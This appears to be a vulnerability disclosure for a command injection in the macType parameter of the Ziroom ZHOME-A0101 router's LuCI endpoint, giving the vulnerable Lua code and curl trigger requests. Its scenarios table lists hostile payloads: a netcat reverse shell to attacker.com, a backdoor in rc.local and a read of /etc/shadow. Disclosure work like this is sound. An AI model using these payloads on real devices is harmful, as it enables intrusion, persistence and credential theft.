# Command Injection Vulnerability in ZHOME ZH-A0101 mac_addr_clone via `macType`

## Overview

- **Vendor:** Ziroom
- **Product:** ZHOME-A0101
- **Firmware Version:** 1.0.1.0, Build 202004151405
- **Platform:** OpenWrt / MediaTek MT7621, MIPS32
- **Vulnerability Type:** Command Injection
- **Affected Endpoint:** `POST /api/ZRMacClone/mac_addr_clone`
- **Affected Parameter:** `macType`
- **Authentication Requirement:** HTTP Basic Auth as `root`
- **Special Condition:** `g_debug=true`
- **Severity:** Critical

## Vulnerability Information

| Item                | Detail                                           |
| ------------------- | ------------------------------------------------ |
| File                | `usr/lib/lua/luci/controller/api/zrMacClone.lua` |
| Function            | `logger()` and `macAddrClone()`                  |
| Code Location       | `logger()` line 26-28, `macAddrClone()` line 41  |
| Injection Location  | line 27                                          |
| Endpoint            | `POST /api/ZRMacClone/mac_addr_clone`            |
| Injection Parameter | `macType`                                        |
| Authentication      | HTTP Basic Auth (`root`)                         |
| Special Condition   | `g_debug=true`                                   |

## Vulnerable Code
<img width="999" height="444" alt="image" src="https://github.com/user-attachments/assets/e57c31a9-b5ee-4b92-8a2c-188cdddca4ce" />
<img width="1653" height="432" alt="image" src="https://github.com/user-attachments/assets/8aa17114-3cf7-435c-80b4-9a965b669af9" />

```lua
-- zrMacClone.lua line 17-28
local g_debug = true
local outlog = '/tmp/mac_clone.log'

local function logger(msg)
    os.execute('echo " ' .. msg .. ' " >>' .. outlog)
end

-- line 41-46
function macAddrClone()
    LuciHttp.prepare_content("application/json")
    local macType = LuciHttp.formvalue("macType")

    if g_debug then logger(macType) end
    -- ...
end
```

The logger places attacker-controlled `macType` inside a shell `echo` command. Although the value is inside double quotes, shell command substitution still works inside double quotes. Therefore, payloads using `$()` or backticks are executed by `/bin/sh`.

## Exploit Chain

```text
Attacker
 |
 |-- Step 1: Obtain the root credential.
 |
 |-- Step 2: Send an authenticated POST request.
 |           URL:
 |           http://192.168.18.1/cgi-bin/luci/;stok=<STOK>/api/ZRMacClone/mac_addr_clone
 |           Body:
 |           macType=<PAYLOAD>
 |
 |-- Step 3A: Inject by using $() command substitution.
 |            macType=test$(touch /tmp/vuln20.txt)
 |            Final command:
 |            echo " test$(touch /tmp/vuln20.txt) " >>/tmp/mac_clone.log
 |
 |-- Step 3B: Inject by using backtick command substitution.
 |            macType=test`touch /tmp/vuln20.txt`
 |            Final command:
 |            echo " test`touch /tmp/vuln20.txt` " >>/tmp/mac_clone.log
 |
 `-- Step 4: /bin/sh expands the command substitution and executes the injected command.
             The echo output is then appended to /tmp/mac_clone.log.
```

## Trigger Request

### `$()` Method

```bash
curl -s --noproxy "*" -b cookies.txt -X POST \
  --data-urlencode "macType=test\$(touch /tmp/vuln20.txt)" \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRMacClone/mac_addr_clone"
```

### Backtick Method

```bash
curl -s --noproxy "*" -b cookies.txt -X POST \
  --data-urlencode "macType=test\`touch /tmp/vuln20.txt\`" \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRMacClone/mac_addr_clone"
```

## Verification

```bash
ssh -p 1022 root@192.168.18.1 "ls -la /tmp/vuln20.txt"
```
<img width="2052" height="249" alt="image" src="https://github.com/user-attachments/assets/95dc6118-fd54-4617-b37e-563ede03fef3" />

## Exploitation Scenarios

| Scenario      | Payload using `$()`                  | Description                   |
| ------------- | ------------------------------------ | ----------------------------- |
| Create file   | `$(touch /tmp/test)`                 | Verify command execution      |
| Write output  | `$(id>/tmp/id.txt)`                  | Save command output to a file |
| Reverse shell | `$(nc attacker.com 4444 -e /bin/sh)` | Requires `nc` on the device   |
| Persistence   | `$(echo backdoor>>/etc/rc.local)`    | Execute on boot               |
| Log poisoning | `$(cat /etc/shadow>/tmp/s.txt)`      | Steal sensitive information   |

## 


